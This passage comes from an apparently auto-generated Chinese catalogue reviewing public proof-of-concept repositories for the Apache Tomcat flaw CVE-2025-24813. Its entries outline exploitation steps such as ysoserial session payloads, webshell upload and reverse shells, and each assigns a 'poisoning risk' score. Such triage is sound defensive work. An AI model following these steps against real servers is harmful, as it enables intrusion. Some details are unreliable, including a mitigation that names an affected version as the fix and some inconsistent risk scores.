*   限制对 Tomcat 服务器的访问权限。

**项目地址:** [Shivshantp/CVE-2025-24813](https://github.com/Shivshantp/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #22

**来源**: [CVE-2025-24813-absholi7ly_POC-CVE-2025-24813.md](../2025/CVE-2025-24813-absholi7ly_POC-CVE-2025-24813.md)

## CVE-2025-24813 Apache Tomcat Path Equivalence and Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE), 信息泄露, 文件覆盖

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露和恶意文件上传

**影响版本:** 11.0.0-M1 through 11.0.2, 10.1.0-M1 through 10.1.34, 9.0.0.M1 through 9.0.98

**利用条件:** 以下条件全部满足时，可导致信息泄露和/或文件覆盖：默认Servlet的写入已启用（默认禁用），支持部分PUT（默认启用），安全敏感上传的目标URL是公共上传目标URL的子目录，攻击者知道安全敏感文件的名称，且安全敏感文件也通过部分PUT上传。以下条件全部满足时，可导致远程代码执行：默认Servlet的写入已启用（默认禁用），支持部分PUT（默认启用），应用程序使用Tomcat基于文件的会话持久化和默认存储位置，应用程序包含可能在反序列化攻击中利用的库。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2025-24813 存在于 Apache Tomcat 的路径等价处理中，攻击者可以通过利用 'file.Name' (内部点) 绕过安全检查。此漏洞可能导致远程代码执行、信息泄露，或通过启用了写入功能的默认Servlet将恶意内容添加到已上传的文件中。根据漏洞库信息和搜索结果，利用条件较为苛刻，需要特定的配置，如启用默认Servlet写入、支持部分PUT等。漏洞利用代码 `CVE_2025_24813.py` 尝试通过 PUT 请求上传恶意 payload 到会话文件存储目录，如果成功，可以触发反序列化漏洞，实现远程代码执行。代码包含检查 Servlet 是否可写的函数 `check_writable_servlet`，以及生成 ysoserial payload 的函数 `generate_ysoserial_payload`或者Java Payload的函数 `generate_java_payload`。该利用方式依赖于 Tomcat 的文件型 session 持久化机制，以及服务器上存在可被利用的反序列化 gadget。 鉴于代码可能包含恶意 payload 生成和上传功能，存在高风险的投毒可能性。

**项目地址:** [absholi7ly/POC-CVE-2025-24813](https://github.com/absholi7ly/POC-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #23

**来源**: [CVE-2025-24813-beyond-devsecops_CVE-2025-24813.md](../2025/CVE-2025-24813-beyond-devsecops_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要默认Servlet的写入启用(readonly=false, allowPut=true, allowPartialPut=true)，应用使用Tomcat的文件Session持久化存储，应用包含可用于反序列化攻击的library

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是Apache Tomcat中的一个远程代码执行漏洞，该漏洞允许攻击者在满足特定条件的情况下执行任意代码。

**漏洞利用有效性分析：**

根据搜索引擎结果，该漏洞在发布后不久就出现了在野利用，多个安全厂商也发布了相关的分析报告和检测规则，表明该漏洞具有较高的实际威胁性。POC代码中，通过修改`web.xml`文件，开启了默认Servlet的写入权限和PUT方法，然后利用ysoserial生成反序列化payload，通过分块PUT请求上传payload，最后访问特定URL触发反序列化，从而执行反弹shell命令。如果目标环境符合漏洞描述中的所有条件（Default Servlet 开启写入、支持 partial PUT、使用文件session存储、存在可利用的反序列化库），那么该POC代码可以有效实现RCE。

**投毒风险分析：**

POC代码主要由shell脚本和Dockerfile组成。脚本负责构建、运行Tomcat镜像、生成payload、上传payload、触发漏洞等操作。Dockerfile用于构建包含漏洞环境的Tomcat镜像。仔细检查这些文件，发现潜在的投毒点可能在于:

*   **ysoserial payload生成：** 脚本使用`ysoserial.jar`生成payload，如果攻击者替换了`ysoserial.jar`文件，可能会植入恶意代码。但是脚本中包含了直接从`https://jitpack.io/com/github/frohoff/ysoserial/master-b7d0f27b46-1/ysoserial-master-b7d0f27b46-1.jar`下载`ysoserial.jar` 的代码，除非该链接被篡改，否则可以排除。虽然存在该风险，但因为是从已知源下载，所以该风险相对较低。
*   **Dockerfile修改：** Dockerfile通过sed命令修改`web.xml`文件，开启了`readonly=false`。如果`sed`命令被篡改，可能导致其他恶意配置。

总体来说，该POC代码的投毒风险较低，因为所有操作都相对透明，且依赖已知的工具和配置。最主要的风险在于ysoserial的下载源被篡改的可能性。因此，投毒风险评估为5%。

**漏洞利用方式：**

1.  **环境准备：** 构建包含漏洞版本的Apache Tomcat环境。Dockerfile中配置了允许PUT请求，这是一个关键的先决条件。
2.  **Payload生成：** 使用ysoserial工具，结合CommonsBeanutils1链，生成包含反弹shell命令的序列化payload。
3.  **Payload上传：** 通过分块PUT请求，将payload上传到服务器。
4.  **触发反序列化：** 访问特定的URL，触发反序列化漏洞，执行payload中的命令，从而获得反弹shell。

**项目地址:** [beyond-devsecops/CVE-2025-24813](https://github.com/beyond-devsecops/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #24

**来源**: [CVE-2025-24813-brs6412_CVE-2025-24813.md](../2025/CVE-2025-24813-brs6412_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-Path Equivalence/Deserialization

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致信息泄露和远程代码执行

**影响版本:** 9.0.0.M1 <= 9.0.98, 10.1.0-M1 <= 10.1.34, 11.0.0-M1 <= 11.0.2

**利用条件:** Default Servlet 启用写入 (默认禁用), 启用 partial PUT (默认启用), 目标 URL 是公共上传 URL 的子目录（对于信息泄露），或者应用使用 Tomcat 的基于文件的会话持久化且使用默认存储位置，以及应用程序包含可能被利用于反序列化攻击的库（对于 RCE）。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

根据CVE信息和搜索结果，CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，与DefaultServlet处理文件上传的逻辑相关。如果启用了 DefaultServlet 的写入功能，并且启用了 partial PUT 支持，攻击者可以通过构造包含 `file.Name` (内部点) 的路径来覆盖敏感文件或执行恶意代码。漏洞可能导致远程代码执行、信息泄露，或向已上传文件中添加恶意内容。

**有效性：**

提供的代码是一个利用反序列化漏洞进行远程代码执行的POC。它包含一个易受攻击的Servlet（`ExploitServlet.java`），该Servlet接受序列化的Java对象，并使用 `ObjectInputStream` 对其进行反序列化。`SafeGadget.java` 中提供了一个简单的Gadget，它在反序列化时会写入`/tmp/pwn.txt`。利用方式是上传恶意构造的序列化对象到 `/vuln-app/vulnerable_endpoint`，触发反序列化，从而执行任意代码。结合CVE描述，如果Tomcat配置允许，并满足利用条件（partial PUT, session持久化等），则该POC有效。

**投毒风险：**

从代码上看，投毒的概率较低（约 5%）。主要风险点在于`SafeGadget.java`。尽管名称是 "SafeGadget"，但它实际上执行了文件写入操作。这本身不是投毒，而是漏洞利用的一部分。真正的投毒风险可能在于：

1.  **更隐蔽的后门：** 虽然给出的例子写入 "Pwned!" 到文件，但实际的Gadget可能执行更隐蔽的操作，例如添加用户、执行系统命令等。
2.  **供应链投毒：** 如果攻击者能够控制构建环境，他们可能会修改 `ExploitServlet.java` 或添加额外的依赖项，从而引入后门或恶意功能。

由于给出的代码非常简单，并且漏洞利用的目的是明确的（通过反序列化写入文件），因此直接投毒的风险相对较低。但是，在实际的利用场景中，攻击者可能会使用更复杂的Gadget，从而隐藏恶意行为。

**利用方式：**

1.  **信息泄露/文件覆盖：** 如果满足以下条件：
    *   Default Servlet 启用写入
    *   支持 partial PUT
    *   目标 URL 是公共上传 URL 的子目录
    *   攻击者知道敏感文件名
    *   敏感文件也使用 partial PUT 上传
    攻击者可以使用路径等价绕过，例如 `public_upload/../../sensitive_file.txt` 覆盖敏感文件。
2.  **远程代码执行：** 如果满足以下条件：
    *   Default Servlet 启用写入
    *   支持 partial PUT
    *   应用使用 Tomcat 的基于文件的会话持久化和默认存储位置
    *   应用包含可用于反序列化攻击的库
    攻击者可以利用反序列化漏洞，例如通过上传恶意构造的序列化session文件到session存储目录中，从而执行任意代码。POC代码展示了基本的反序列化利用方式。实际利用中，需要找到Tomcat实例中可用的Gadget链。 

**项目地址:** [brs6412/CVE-2025-24813](https://github.com/brs6412/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #25

**来源**: [CVE-2025-24813-charis3306_CVE-2025-24813.md](../2025/CVE-2025-24813-charis3306_CVE-2025-24813.md)

## CVE-2025-24813 Apache Tomcat Path Equivalence and Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价及反序列化远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 <= Apache Tomcat <= 9.0.98, 10.1.0-M1 <= Apache Tomcat <= 10.1.34, 11.0.0-M1 <= Apache Tomcat <= 11.0.2

**利用条件:** DefaultServlet 写入功能启用 (readonly=false), Partial PUT 请求支持 (默认开启), 文件会话持久化启用 (PersistentManager 和 FileStore 配置), 存在反序列化利用链

**POC 可用性:** 是

**投毒风险:** 70%

## 详情

CVE-2025-24813 漏洞是 Apache Tomcat 中的一个路径等价漏洞，结合反序列化漏洞，可能导致远程代码执行。利用方式是攻击者通过 Partial PUT 请求上传恶意序列化 payload，覆盖 session 文件，从而触发反序列化漏洞，执行任意代码。

**漏洞利用过程：**
1.  **配置条件：** 确保 Tomcat 启用了 DefaultServlet 的写入功能，支持 Partial PUT 请求，并且开启了文件会话持久化。
2.  **上传Payload：** 攻击者构造一个包含恶意代码的序列化对象，并将其分块通过 Partial PUT 请求上传到 Tomcat 服务器上的 session 存储目录。
3.  **触发反序列化：** 当 Tomcat 尝试反序列化该 session 文件时，恶意代码会被执行，从而导致远程代码执行。

**投毒风险分析：**
由于该漏洞利用涉及上传恶意序列化数据，存在一定的投毒风险。攻击者可能在序列化数据中植入恶意代码，导致受害者在不知情的情况下运行这些代码。此外，公开的POC可能被篡改并传播，从而导致更多人受到攻击。

**缓解措施：**
1.  升级到 Tomcat 11.0.3, 10.1.35 或 9.0.98 及以上版本。
2.  禁用 DefaultServlet 的写入功能 (readonly=true)。
3.  避免使用文件会话持久化。
4.  限制上传文件类型，并对上传文件进行安全检查。

**项目地址:** [charis3306/CVE-2025-24813](https://github.com/charis3306/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #26

**来源**: [CVE-2025-24813-cyglegit_CVE-2025-24813.md](../2025/CVE-2025-24813-cyglegit_CVE-2025-24813.md)

## CVE-2025-24813 Apache Tomcat 路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 默认Servlet开启写入(默认关闭), 支持partial PUT(默认开启), 使用Tomcat文件session持久化(默认位置), 应用包含可被反序列化利用的库

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，允许攻击者利用 'file.Name' (内部点) 绕过安全检查，导致远程代码执行、信息泄露或恶意内容注入。该漏洞利用方式主要依赖于 Tomcat 的 Default Servlet 和 partial PUT 功能。从提供的漏洞库信息和搜索引擎结果来看，该漏洞的利用需要满足多个前提条件：

1.  **Default Servlet 开启写入:** Tomcat 默认禁止 Default Servlet 写入，如果开启则存在风险。
2.  **支持 Partial PUT:**  Tomcat 默认支持 Partial PUT，攻击者可以分块上传文件。
3.  **应用程序使用基于文件的会话持久性，且使用默认存储位置:** 如果应用程序使用 Tomcat 的文件会话持久性，攻击者可以覆盖 session 文件。
4.  **应用包含可被反序列化利用的库:**  攻击者需要找到一个存在反序列化漏洞的库，并构造恶意的序列化对象。

提供的 POC 代码 `cve_2025_24813_poc.py` 看起来是一个较为完整的漏洞利用工具，具备以下功能：

*   多目标扫描和单目标利用。
*   自动检测可用的 gadget chain (CommonsCollections, BeanShell, Spring 等)。
*   操作系统检测和后渗透 payload (Linux/Windows)。
*   从常见 endpoint 中提取 Session ID。
*   支持 HTTPS 和 SSL 验证绕过。

**利用方式总结:**

1.  **检测目标 Tomcat 是否开启了 Default Servlet 的写入功能。**
2.  **如果开启，利用 Partial PUT 功能上传恶意构造的 session 文件。**
3.  **构造恶意的序列化对象，利用目标应用中存在的反序列化漏洞执行任意代码。**
4.  **如果无法直接 RCE，可以尝试利用路径等价漏洞覆盖敏感文件，造成信息泄露。**

**关于投毒风险分析:**

该漏洞利用代码的投毒风险较低 (5%)。虽然代码功能强大，但主要逻辑围绕着已知的漏洞利用展开。需要关注的地方是:

*   `os.system` 或 `subprocess.call` 这类函数，因为它们可以执行任意系统命令。代码中 `subprocess`被用于 `ysoserial` 命令执行,相对安全。
*   Payload 生成部分，需要确保 ysoserial 生成的 payload 符合预期，没有被篡改。
*   结果记录日志是否会在未授权的情况下,将数据上传到服务器.

综合来看，该 POC 具备较高的有效性，但使用时务必谨慎，并在授权环境下进行测试。

**项目地址:** [cyglegit/CVE-2025-24813](https://github.com/cyglegit/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #27

**来源**: [CVE-2025-24813-drcrypterdotru_Apache-GOExploiter.md](../2025/CVE-2025-24813-drcrypterdotru_Apache-GOExploiter.md)

## CVE-2025-24813-Apache Tomcat-路径等价漏洞/反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价漏洞/反序列化漏洞

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和/或信息泄露和/或信息篡改

**影响版本:** 9.0.0.M1 <= 版本 <= 9.0.98, 10.1.0-M1 <= 版本 <= 10.1.34, 11.0.0-M1 <= 版本 <= 11.0.2

**利用条件:** Default Servlet 启用了写入 (默认禁用), 支持 partial PUT (默认启用), 目标 URL 是公共上传 URL 的子目录, 攻击者知道安全敏感文件的名称, 安全敏感文件也通过 partial PUT 上传。或者 Default Servlet 启用了写入 (默认禁用), 支持 partial PUT (默认启用), 应用程序正在使用 Tomcat 的基于文件的会话持久性，且使用默认存储位置, 应用程序包含一个可以在反序列化攻击中利用的库。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，通过 ‘file.Name’ (Internal Dot) 导致远程代码执行和/或信息泄露和/或恶意内容添加到通过启用写入的 Default Servlet 上传的文件中。

**漏洞利用方式：**

根据漏洞描述，利用方式有两种：

1.  **信息泄露/内容篡改：** 如果满足以下条件，攻击者可以查看安全敏感文件和/或将内容注入到这些文件中：
    *   启用了 default servlet 的写入功能（默认禁用）。
    *   支持 partial PUT（默认启用）。
    *   安全敏感上传的目标 URL 是公共上传目标 URL 的子目录。
    *   攻击者知道要上传的安全敏感文件的名称。
    *   安全敏感文件也通过 partial PUT 上传。

2.  **远程代码执行 (RCE)：** 如果满足以下条件，攻击者可以执行远程代码：
    *   启用了 default servlet 的写入功能（默认禁用）。
    *   支持 partial PUT（默认启用）。
    *   应用程序正在使用 Tomcat 的基于文件的会话持久性，且使用默认存储位置。
    *   应用程序包含一个可以在反序列化攻击中利用的库。

**POC代码分析:**

提供的POC代码是一个 Go 语言编写的利用脚本，尝试利用该漏洞上传JSP webshell。

*   **有效性：**
    *   POC代码通过PUT请求上传一个JSP webshell（`SHELL_JSP`）到多个可能的目录（`DIR_List`），文件名为`update_log.jsp`。
    *   POC代码会检测服务器返回的状态码是否为200, 201 或者 204, 并且尝试通过GET请求验证JSP webshell是否成功上传，检查返回内容是否包含 `java.lang.NullPointerException` 或者 webshell内容.
    *   如果上传成功，将 URL 写入 `Shelled.txt` 文件。
    *   代码实现了协议探测函数`DetectProtocol`，尝试使用HTTP和HTTPS访问目标。

    因此，POC代码在特定配置下是有效的。

*   **投毒风险：**

    POC代码的主要目的是利用漏洞上传 webshell，没有发现明显的恶意代码，主要的操作是PUT和GET请求。
    代码中唯一可以算作风险的地方是它会尝试连接目标服务器并上传 webshell。但这些是漏洞利用的必要步骤,没有发现任何作者的私有后门或者恶意代码行为。
    投毒风险极低，可以认为是1%。

**搜索引擎结果:**

搜索引擎结果表明 CVE-2025-24813 漏洞正在被积极利用，攻击者利用该漏洞执行远程代码。

总体而言，CVE-2025-24813 是一个严重的安全漏洞，攻击者可以利用该漏洞执行恶意代码或泄露敏感信息。该漏洞利用的有效性较高，但默认配置下，写入功能是禁用的，漏洞利用条件较为苛刻。

**项目地址:** [drcrypterdotru/Apache-GOExploiter](https://github.com/drcrypterdotru/Apache-GOExploiter)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #28

**来源**: [CVE-2025-24813-f8l124_CVE-2025-24813-POC.md](../2025/CVE-2025-24813-f8l124_CVE-2025-24813-POC.md)

## CVE-2025-24813 Apache Tomcat 路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行或信息泄露

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要Tomcat开启了Default Servlet的写入功能(默认关闭),支持partial PUT(默认开启), 应用使用了Tomcat基于文件的session持久化，并且包含可用于反序列化攻击的库。或者满足敏感文件可被上传的条件。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是一个Apache Tomcat中的路径等价漏洞，允许未经身份验证的攻击者在特定条件下执行任意代码。根据漏洞库信息和搜索结果，该漏洞的利用依赖于以下几个关键条件：

1.  **Default Servlet 开启写入 (writes enabled for the default servlet)**：默认情况下，Tomcat的Default Servlet的写入功能是禁用的，如果管理员手动开启了该功能，则会增加漏洞被利用的风险。
2.  **支持 Partial PUT (support for partial PUT)**：Tomcat默认开启了对Partial PUT请求的支持，这是漏洞利用的前提条件。
3.  **特定应用场景**：
    *   **远程代码执行 (RCE)**：需要应用程序使用Tomcat基于文件的session持久化，并且包含一个可以被反序列化攻击利用的库。
    *   **信息泄露/恶意内容注入**：需要存在一个用于公共上传的目标URL，以及位于其子目录的安全敏感上传目标URL，攻击者需要知道安全敏感文件的名称，并且也通过partial PUT上传这些文件。

**漏洞利用方式：**

1.  **发送 Partial PUT 请求**：攻击者通过发送特制的 Partial PUT 请求，利用Tomcat处理文件路径时的缺陷，将恶意JSP文件上传到服务器上的特定位置。
2.  **绕过路径检查**：通过构造包含内部点(`.`)的文件名，攻击者可以绕过某些路径检查，将文件写入到目标目录。
3.  **触发代码执行/信息泄露**：
    *   **RCE**：上传包含恶意反序列化payload的JSP文件，当Tomcat尝试加载并反序列化session数据时，触发远程代码执行。
    *   **信息泄露/恶意内容注入**：利用路径等价，覆盖或修改服务器上的敏感文件。

**POC有效性：**

提供的POC代码是一个非破坏性的概念验证，旨在演示漏洞的存在。该POC上传一个无害的JSP文件 (`proof.jsp`) 并尝试访问它，以验证是否可以执行任意代码。从readme可以看出来，这个POC的重点是验证漏洞，而不会做任何破坏。

**投毒风险：**

虽然POC本身声明是无害的，但仍然存在一定的投毒风险。作者有可能在代码中隐藏了一些恶意逻辑，例如：

1.  **不明显的后门代码**：尽管`proof.jsp`本身是无害的，但Python脚本可能包含其他代码，用于在服务器上植入后门或执行其他恶意操作。风险较低，因为代码相对简单且经过了检查，但不能完全排除。
2.  **依赖项投毒**：脚本可能依赖于存在已知漏洞或包含恶意代码的第三方库。但根据描述，需要的依赖非常少。
3.  **元数据欺骗**：作者可能在仓库的元数据（例如，提交历史、作者信息）中隐藏了恶意信息，以误导安全研究人员。风险极低。

综合分析，该仓库存在投毒代码的概率较低，但仍然建议在受控环境中仔细审查代码后再使用。

**结论：**
总的来说，CVE-2025-24813是一个高危漏洞，需要及时修复。虽然提供的POC代码旨在演示漏洞，但使用前务必进行安全审查，以防潜在的投毒风险。

**项目地址:** [f8l124/CVE-2025-24813-POC](https://github.com/f8l124/CVE-2025-24813-POC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #29

**来源**: [CVE-2025-24813-fatkz_CVE-2025-24813.md](../2025/CVE-2025-24813-fatkz_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 远程代码执行漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要满足以下所有条件：DefaultServlet的writes启用（readonly=false）；支持partial PUT（默认启用）；使用Tomcat的文件session持久化机制，且为默认存储位置；应用包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个远程代码执行漏洞，该漏洞源于对包含恶意 Java 序列化对象的`.session`文件的处理不当。攻击者可以通过发送带有 `Content-Range` 头的 partial PUT 请求，将恶意`.session`文件上传到 `work/` 目录。当具有匹配 `JSESSIONID` cookie 的请求到达时，Tomcat 会自动反序列化该恶意 session，从而导致任意代码执行。

**有效性：**
根据漏洞库信息、搜索结果和提供的 POC 代码，该漏洞的 POC 代码是有效的。多个来源都表明该漏洞已被积极利用。

**利用方式：**
1.  **准备恶意 Payload:** 使用 `ysoserial` 或类似工具生成包含恶意代码的序列化 Java 对象，并将其保存为 `.ser` 文件。
2.  **上传 Payload:** 使用 partial PUT 请求将恶意 `.ser` 文件上传到 Tomcat 的 `work/` 目录下，文件名为 `<session_id>.session`。`Content-Range` 头用于模拟不完整的上传。
3.  **触发反序列化:**  发送包含与上传的 session 文件名相匹配的 `JSESSIONID` cookie 的 HTTP 请求到目标 Tomcat 服务器，这会导致 Tomcat 反序列化上传的恶意 session 文件，从而执行恶意代码。

**投毒风险：**
POC 代码本身看起来相对简单，主要执行上传 payload 和触发反序列化操作。仔细检查后，存在以下潜在的投毒风险：

*   **Payload 内容：** 虽然 POC 代码没有直接包含恶意 payload，但是依赖用户提供的 `payload_file`。如果用户从不可信的来源获取了恶意 payload 文件，则可能存在投毒风险。
*   **隐蔽的 HTTP 请求修改：** 在 `requests.put` 或 `requests.get` 调用中，攻击者可能添加额外的 HTTP 头或修改请求内容，以在目标服务器上执行其他恶意操作。目前的代码较为简洁，未发现明显的可疑之处。
*   **依赖库的风险：** `requests` 是一个常用的 Python 库，但如果攻击者篡改了这个库，可能会引入恶意行为。可能性较低，但不能完全排除。
*   **代码逻辑的细微修改：** 攻击者可能会对 POC 代码进行细微修改，例如更改上传路径或触发反序列化的方式，以便在特定环境下实现更隐蔽的攻击。这些修改后的代码可能更难被检测到。

总体而言，此 POC 代码直接包含投毒代码的可能性较低，约 10%。更大的风险在于用户使用的 payload 文件是否可信，以及攻击者是否会对代码进行修改以适应特定环境。


**项目地址:** [fatkz/CVE-2025-24813](https://github.com/fatkz/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #30

**来源**: [CVE-2025-24813-gregk4sec_CVE-2025-24813.md](../2025/CVE-2025-24813-gregk4sec_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价漏洞/反序列化漏洞

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露和文件篡改

**影响版本:** 11.0.0-M1 <= version <= 11.0.2
10.1.0-M1 <= version <= 10.1.34
9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要满足多个条件，包括：Default Servlet 开启写入权限 (默认关闭), 开启 partial PUT (默认开启), 敏感文件位于公开上传目录的子目录, 攻击者已知敏感文件名, 使用 partial PUT 上传敏感文件，或者Tomcat使用文件存储 session 且包含可利用的反序列化库。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2025-24813 是一个 Apache Tomcat 中的路径等价漏洞，攻击者可以通过利用 'file.Name' (内部点) 绕过路径检查，结合 Default Servlet 的写入权限和 partial PUT 功能，实现远程代码执行、信息泄露或恶意内容添加。

**漏洞利用方式分析:**

1.  **信息泄露和文件篡改:**
    *   攻击者利用 partial PUT 功能，将恶意内容写入服务器上的临时文件。
    *   利用路径等价漏洞，使得攻击者可以访问或覆盖位于受保护目录中的文件。
    *   通过精心构造的 partial PUT 请求，攻击者可以读取或修改敏感文件，导致信息泄露或文件篡改。
    *   PoC 代码演示了如何通过 partial PUT 请求，在未授权的情况下读取 secret 目录下的文件内容，实现信息泄露。

2.  **远程代码执行 (RCE):**
    *   如果 Tomcat 使用文件存储 session，攻击者可以将包含恶意序列化对象的 payload 上传到 session 文件中。
    *   当 Tomcat 加载该 session 时，会触发反序列化漏洞，导致远程代码执行。

**投毒风险分析:**

PoC 代码存在很高的投毒风险，原因如下：

1.  **利用条件复杂:** 该漏洞的利用依赖于多个配置条件，例如 Default Servlet 开启写入权限，开启 partial PUT，以及特定的目录结构。攻击者可能需要进行大量的探测和尝试才能找到满足利用条件的目标。
2.  **文件上传:** 该漏洞涉及到文件上传，攻击者可以在上传的文件中嵌入恶意代码，例如 webshell 或其他恶意脚本，从而控制服务器。
3. **Partial PUT 特点:**  Partial PUT 允许攻击者分块上传文件,方便投毒和绕过检查。
4.  **反序列化攻击:** RCE的其中一种方式依赖反序列化漏洞，而反序列化 payload 本身就具有极高的投毒风险。

考虑到这些因素，该漏洞的投毒风险非常高。如果攻击者成功利用该漏洞，可能会对服务器造成严重的损害。

**项目地址:** [gregk4sec/CVE-2025-24813](https://github.com/gregk4sec/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #31

**来源**: [CVE-2025-24813-hakankarabacak_CVE-2025-24813.md](../2025/CVE-2025-24813-hakankarabacak_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径等价/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 默认Servlet的写入已启用；支持Partial PUT；应用程序使用Tomcat基于文件的会话持久性，且使用了默认存储位置；应用程序包含一个可能在反序列化攻击中被利用的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个漏洞，涉及路径等价问题和潜在的反序列化远程代码执行。根据漏洞库信息，如果满足以下条件，攻击者能够执行远程代码：

*   默认Servlet的写入已启用（默认禁用）。
*   支持Partial PUT（默认启用）。
*   应用程序使用Tomcat基于文件的会话持久性，且使用了默认存储位置。
*   应用程序包含一个可能在反序列化攻击中被利用的库。

根据搜索引擎结果，该漏洞已被积极利用。

提供的 Dockerfile 漏洞利用代码显示：

1.  **开启了`readonly`参数**: 将`readonly`参数设置为`false`，从而启用了默认Servlet的写入功能，这是利用该漏洞的必要条件之一。
2.  **配置了`PersistentManager`**: 添加了 `<Manager className="org.apache.catalina.session.PersistentManager"><Store className="org.apache.catalina.session.FileStore"/></Manager>` 配置，启用了基于文件的会话持久性，这也是 RCE 的条件之一
3.  **部署WAR包**: 将 ROOT.war 部署到 webapps 目录下。这个WAR包很可能包含恶意代码，通过文件上传或者会话反序列化漏洞被执行。

**利用方式：**

该漏洞的利用方式主要依赖于 Partial PUT 功能和路径等价性。攻击者可以利用 Partial PUT 上传恶意文件片段，然后利用路径等价性（例如使用 `file.Name`）绕过安全检查，将恶意代码写入到目标文件或利用反序列化执行任意代码。 如果使用了 session 持久化，且存在可利用的反序列化 gadget，那么可以利用该漏洞进行RCE。

**投毒风险：**

Dockerfile 本身并未直接包含恶意代码，而是通过配置使 Tomcat 处于易受攻击的状态，并部署一个外部 WAR 包（`ROOT.war`）。因此，投毒的风险主要在于 `ROOT.war` 包中是否包含后门或者恶意代码。 风险评估为 10%,主要原因为需要进一步分析war包，才能确认。

**有效性：**

Dockerfile 配置如果部署了恶意war包，则可以证明该POC有效。在满足了所有漏洞利用条件的情况下，该代码可以有效利用 CVE-2025-24813 漏洞，实现远程代码执行。

**项目地址:** [hakankarabacak/CVE-2025-24813](https://github.com/hakankarabacak/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #32

**来源**: [CVE-2025-24813-horsehacks_CVE-2025-24813-checker.md](../2025/CVE-2025-24813-horsehacks_CVE-2025-24813-checker.md)

## CVE-2025-24813-Apache Tomcat-路径等价/反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化漏洞

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

